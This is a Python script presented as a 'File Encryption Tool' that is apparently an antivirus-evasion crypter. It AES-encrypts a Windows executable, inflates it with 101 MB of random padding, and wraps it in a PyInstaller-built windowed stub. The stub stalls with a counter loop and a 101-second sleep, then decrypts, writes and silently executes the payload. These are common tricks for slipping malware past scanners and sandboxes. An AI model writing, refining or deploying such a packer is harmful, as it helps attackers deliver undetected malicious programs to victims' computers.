import argparse
import os
import shutil
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad


# Constants
KEY = get_random_bytes(16)  # 16 bytes AES key
SIZE_INCREMENT = 101 * 1024 * 1024  # 101 MB increment
SLEEP_TIME = 101  # 101 seconds
COUNTER_INCREMENT = 100001  # Increment counter by 100001


def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="File Encryption Tool")
    parser.add_argument("file", help="Path to the executable file to encrypt")
    args = parser.parse_args()

    if args.file:
        # Check if the file exists and is executable
        if (
            os.path.exists(args.file)
            and os.path.isfile(args.file)
            and args.file.endswith(".exe")
        ):
            file_dir = os.path.dirname(args.file)
            file_name = os.path.basename(args.file)
            script_file = f"{file_name.split('.exe')[0]}_encrypted"
            iv, encrypted_data = encrypt_file(args.file)
            create_decryption_script(
                file_dir, file_name, iv, encrypted_data, script_file
            )
        else:
            print("File does not exist or is not a valid .exe file.")
    else:
        parser.print_help()


def encrypt_file(file):
    print(f"Encrypting file: {file} ...")
    with open(file, "rb") as f:
        data = f.read()

    # Pad the data to the AES block size
    padded_data = pad(data, AES.block_size)
    padding = os.urandom(SIZE_INCREMENT)  # Random padding to increase file size

    # Generate a random IV and encrypt the data
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    ct_bytes = cipher.encrypt(padded_data + padding)

    print(f"File encrypted: {file}")
    return iv, ct_bytes


def create_decryption_script(file_dir, input_file, iv, encrypted_data, script_file):
    print("Creating decryption script...")
    encrypted_data_hex = (
        encrypted_data.hex()
    )  # Convert to hex for embedding in the script
    iv_hex = iv.hex()  # Convert IV to hex for embedding

    decrypt_script = f"""
import os
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

KEY = bytes.fromhex("{KEY.hex()}")
IV = bytes.fromhex("{iv_hex}")
SLEEP_TIME = {SLEEP_TIME}
SIZE_INCREMENT = {SIZE_INCREMENT}
COUNTER_INCREMENT = {COUNTER_INCREMENT}

# Increment counter
for increment in range(COUNTER_INCREMENT):
    pass
print("Incremented counter by 100001")

# Sleep for 101 seconds
print("Sleeping for 101 seconds")
time.sleep(SLEEP_TIME)

# Decrypt the data
cipher = AES.new(KEY, AES.MODE_CBC, IV)
encrypted_data = bytes.fromhex("{encrypted_data_hex}")
decrypted_data = cipher.decrypt(encrypted_data)

# Remove padding and the added SIZE_INCREMENT
decrypted_data = unpad(decrypted_data[:-SIZE_INCREMENT], AES.block_size)

# Write decrypted file
output_file = r"{file_dir}\\{input_file.split(".exe")[0]}_decrypted.exe"
with open(output_file, "wb") as f:
    f.write(decrypted_data)

# Optionally, execute the decrypted file
os.system(output_file)
"""

    script_path = os.path.join(file_dir, script_file + ".py")
    with open(script_path, "w") as f:
        f.write(decrypt_script)

    # Package the decryption script into an executable
    try:
        print("Packaging decryption script...")
        subprocess.run(
            f"pyinstaller --onefile --windowed --log-level=WARN {script_path}",
            shell=True,
            check=True,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
    except subprocess.CalledProcessError as e:
        print(f"Error packaging the decryption script: {e}")
        return

    print("Cleaning up temporary files and moving the executable...")
    # Clean up temporary files
    try:
        os.remove(script_path)
        os.remove(script_file + ".spec")
        shutil.move(
            f".\\dist\\{script_file}.exe", os.path.join(file_dir, script_file + ".exe")
        )
        shutil.rmtree(".\\dist")
        shutil.rmtree(".\\build")
    except Exception as e:
        print(f"Error cleaning up temporary files: {e}")

    print(f"Decryption script ready: {os.path.join(file_dir, script_file + '.exe')}")
    print("Done!")


if __name__ == "__main__":
    main()
